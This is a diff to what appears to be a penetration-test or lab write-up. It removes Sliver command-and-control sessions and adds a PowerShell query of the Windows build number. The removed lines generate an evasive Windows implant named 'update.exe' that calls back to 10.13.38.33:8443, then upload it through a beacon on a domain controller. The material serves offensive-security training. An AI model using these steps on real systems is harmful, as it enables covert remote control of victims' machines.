@@ -370,40 +370,10 @@ PS Microsoft.PowerShell.Core\FileSystem::\\172.16.40.50\files\IT>
 
 ```
 
-```
-sliver > jobs
-
- ID   Name   Protocol   Port   Stage Profile
-==== ====== ========== ====== ===============
- 1    mtls   tcp        8443
-
-sliver > generate --os windows --arch amd64 --format exe --mtls 10.13.38.33:8443 --evasion --save /tmp/update.exe
-
-[*] Generating new windows/amd64 implant binary
-[*] Symbol obfuscation is enabled
-[*] Build completed in 2m0s
-[*] Implant saved to /tmp/update.exe
-
-sliver >
-
-```
-
-```
-sliver > use 09253acf
-
-[*] Active beacon BLUSHING_ERROR (09253acf-c260-4332-b32c-3705a267d81b)
-
-sliver (BLUSHING_ERROR) >
-sliver (BLUSHING_ERROR) > upload /tmp/update.exe "C:\ProgramData\update.exe"
-
-[*] Tasked beacon BLUSHING_ERROR (00f0c14d)
-
-[*] Beacon 616ce2f6 BLUSHING_ERROR - 172.16.40.5:56665 (DC01) - windows/amd64 - Mon, 13 Jul 2026 15:10:34 CEST
-
-[+] BLUSHING_ERROR completed task 00f0c14d
-
-[*] Wrote file to C:\ProgramData\update.exe
-
-sliver (BLUSHING_ERROR) >
+``` powershell
+PS C:\Windows\system32> (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber
+(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber
+20348
+PS C:\Windows\system32>
 
 ```
